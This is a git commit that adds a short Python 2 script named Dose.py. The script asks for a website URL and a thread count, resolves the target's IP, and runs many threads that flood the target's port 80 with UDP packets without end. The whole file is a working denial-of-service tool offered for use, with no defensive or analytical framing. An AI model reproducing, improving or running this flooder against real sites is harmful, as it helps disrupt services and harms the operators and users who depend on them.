3c220029cd00b55e7ee525e956dd943b01a0fab2
Creack_Dark <122866762+CreackDark@users.noreply.github.com>
2023-02-12 15:07:40 +0330

    Create Dose.py

---
+++ Dose.py
@@ -0,0 +1,56 @@
+import time
+
+import socket
+
+import sys
+
+import os
+
+import thread
+
+os.system("clear")
+
+os.system("figlet Creack_Dark")
+
+print "https://mehdieditor.websites.co.in"
+
+print "Dark"
+
+site = raw_input("Enter your site url = ")
+
+thread_count = input("Enter your thread = ")
+
+ip = socket.gethostbyname(site)
+
+UDP_PORT = 80
+
+MESSAGE = "Creack_Dark"
+
+print "UDP target IP:", ip
+
+print "UDP target port:", UDP_PORT
+
+time.sleep(3)
+
+def dos(i):
+
+  while True:
+
+      sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+
+      sock.sendto(MESSAGE, (ip, UDP_PORT))
+
+      print "Packet Sent"
+
+for i in xrange(thread_count):
+
+  try:
+
+   thread.start_new_thread( dos , ("Thread-"+str(i),) )
+
+  except KeyboardInterrupt:
+
+      sys.exit(0)
+
+while 1:
+  pass
